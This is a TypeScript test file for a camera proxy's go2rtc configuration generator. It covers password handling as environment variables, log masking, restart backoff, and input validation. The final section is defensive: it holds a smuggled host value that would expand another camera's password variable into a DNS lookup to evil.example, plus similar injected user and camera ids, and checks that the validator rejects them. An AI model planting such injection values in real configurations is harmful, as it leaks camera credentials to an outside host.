import { execFile } from 'child_process';
import { promisify } from 'util';
import { afterEach, describe, expect, it } from 'vitest';
import { freePort } from './helpers/proxy';
import { Backoff } from '../src/cameras/backoff';
import { setLogLevel } from '../src/log';
import { Go2rtc, go2rtcConfig, passwordEnv, type StreamSource } from '../src/stills/go2rtc';

const run = promisify(execFile);
const binary = process.env.CAMPROXY_TEST_GO2RTC;
const src = (cam: string, password = `pw-${cam}`): StreamSource => ({ cam, host: '127.0.0.1', port: 9, user: 'proxy', password });
const cleanup: (() => Promise<unknown>)[] = [];
afterEach(async () => {
  for (const f of cleanup.splice(0).reverse()) await f();
});

describe('go2rtc config (spec §8.5)', () => {
  it('two streams per camera; each password only as its env variable', () => {
    const text = go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [src('cam3', 's3cr3t!'), src('cam-4', 'x')]);
    const cfg = JSON.parse(text);
    expect(Object.keys(cfg.streams)).toEqual(['cam3_sub', 'cam3_main', 'cam-4_sub', 'cam-4_main']);
    expect(cfg.streams.cam3_sub).toBe('rtsp://proxy:${CAM_CAM3_PASSWORD}@127.0.0.1:9/h264Preview_01_sub');
    expect(cfg.streams['cam-4_main']).toBe('rtsp://proxy:${CAM_CAM_4_PASSWORD}@127.0.0.1:9/h264Preview_01_main');
    expect(text).not.toContain('s3cr3t');
    expect(passwordEnv('cam-4')).toBe('CAM_CAM_4_PASSWORD');
  });
});

describe.skipIf(!binary)('one go2rtc, many cameras', () => {
  it('starts with every camera, adds and removes one without a restart', async () => {
    let sources = [src('cam3'), src('cam4')];
    const g = new Go2rtc({ binary, rtspPort: await freePort(), apiPort: await freePort(), sources: () => sources });
    cleanup.push(() => g.stop());
    await g.start();
    const pid = g.pid();
    expect(Object.keys(await g.streams()).sort()).toEqual(['cam3_main', 'cam3_sub', 'cam4_main', 'cam4_sub']);
    sources = [...sources, src('cam5')];
    await g.setStream(src('cam5'));
    await g.removeStream('cam4');
    expect(Object.keys(await g.streams()).sort()).toEqual(['cam3_main', 'cam3_sub', 'cam5_main', 'cam5_sub']);
    expect(g.pid()).toBe(pid);
    const { stdout } = await run('ps', ['-o', 'args=', '-p', String(pid)]);
    expect(stdout).not.toContain('pw-cam3');
  }, 30_000);
});

describe('go2rtc down: stream changes never hang', () => {
  it('setStream and removeStream on a go2rtc that is not running return at once (the next spawn reads the sources)', async () => {
    const g = new Go2rtc({ binary: '/nonexistent/go2rtc', rtspPort: 1, apiPort: 2, sources: () => [] });
    const t0 = Date.now();
    await g.setStream(src('cam5'));
    await g.removeStream('cam5');
    expect(Date.now() - t0).toBeLessThan(500);
  });
});

describe('go2rtc that never gets ready', () => {
  it('start fails, and the host retries it with the backoff (spec §3.3)', async () => {
    const { chmodSync, mkdtempSync, writeFileSync } = await import('fs');
    const { tmpdir } = await import('os');
    const { join } = await import('path');
    const dir = mkdtempSync(join(tmpdir(), 'camproxy-fake-go2rtc-'));
    const fake = join(dir, 'go2rtc');
    writeFileSync(fake, '#!/bin/sh\nexec sleep 30\n');
    chmodSync(fake, 0o755);
    const g = new Go2rtc({ binary: fake, rtspPort: await freePort(), apiPort: await freePort(), readyMs: 300, sources: () => [], backoff: new Backoff({ firstMs: 100 }) });
    cleanup.push(() => g.stop());
    await expect(g.start()).rejects.toThrow(/go2rtc_not_ready/);
    const first = g.pid();
    expect(first).toBeDefined();
    const t0 = Date.now();
    while (g.pid() === first || g.pid() === undefined) {
      if (Date.now() - t0 > 5000) throw new Error('not retried');
      await new Promise((r) => setTimeout(r, 50));
    }
    expect(() => process.kill(first!, 0)).toThrow(); // the first one was ended
  }, 15_000);
});

describe('go2rtc output: no password in a log line', () => {
  it("masks a camera's password that came after the spawn (an added camera, Ruling P2-1)", async () => {
    const { chmodSync, mkdtempSync, writeFileSync } = await import('fs');
    const { tmpdir } = await import('os');
    const { join } = await import('path');
    const dir = mkdtempSync(join(tmpdir(), 'camproxy-fake-go2rtc-'));
    const fake = join(dir, 'go2rtc');
    writeFileSync(fake, '#!/bin/sh\nsleep 0.3\necho "dial rtsp://proxy:late-secret-77@192.0.2.5:554/x failed" 1>&2\nexec sleep 30\n');
    chmodSync(fake, 0o755);
    let sources: StreamSource[] = [];
    const g = new Go2rtc({ binary: fake, rtspPort: await freePort(), apiPort: await freePort(), readyMs: 3000, sources: () => sources });
    cleanup.push(() => g.stop());
    const out: string[] = [];
    const write = process.stdout.write.bind(process.stdout);
    process.stdout.write = ((chunk: string | Uint8Array, ...rest: unknown[]) => (out.push(String(chunk)), (write as (...a: unknown[]) => boolean)(chunk, ...rest))) as typeof process.stdout.write;
    setLogLevel('debug');
    try {
      const started = g.start().catch(() => undefined);
      sources = [src('cam5', 'late-secret-77')];
      await new Promise((r) => setTimeout(r, 1000));
      expect(out.some((l) => l.includes('"go2rtc"') && l.includes('dial rtsp://proxy:'))).toBe(true);
      expect(out.join('')).not.toContain('late-secret-77');
      await g.stop();
      await started;
    } finally {
      process.stdout.write = write;
      setLogLevel('silent');
    }
  }, 15_000);
});

// Review of #173: go2rtc expands ${VAR} anywhere in its config, and one go2rtc
// holds every camera's password variable: a host like the one below would
// send cam1's password out in a DNS lookup.
describe('go2rtc config: nothing it would expand', () => {
  const EXPLOIT = 'x${CAM_CAM1_PASSWORD}.evil.example';
  it('refuses a host with ${…} (the exploit) or anything but a name/address and port', () => {
    expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), host: EXPLOIT }])).toThrow(/cam3: unsafe stream source host/);
    for (const host of ['a$b', 'a{b}', 'a@b', 'a/b', 'a b', '']) expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), host }])).toThrow(/unsafe stream source host/);
    expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), port: 1.5 }])).toThrow(/unsafe stream source port/);
    expect(() => go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), cam: 'Cam${X}' }])).toThrow(/unsafe stream source camera id/);
  });
  it('a user with $ or { is percent-encoded: never ${ in the config', () => {
    const text = go2rtcConfig({ rtspPort: 1, apiPort: 2 }, [{ ...src('cam3'), user: 'u${CAM_CAM1_PASSWORD}' }]);
    const cfg = JSON.parse(text) as { streams: Record<string, string> };
    expect(cfg.streams.cam3_sub).toBe('rtsp://u%24%7BCAM_CAM1_PASSWORD%7D:${CAM_CAM3_PASSWORD}@127.0.0.1:9/h264Preview_01_sub');
  });
  it('setStream refuses the exploit host before any API call', async () => {
    const g = new Go2rtc({ binary: '/nonexistent/go2rtc', rtspPort: 1, apiPort: 2, sources: () => [] });
    await expect(g.setStream({ ...src('cam6'), host: EXPLOIT })).rejects.toThrow(/unsafe stream source host/);
  });
});
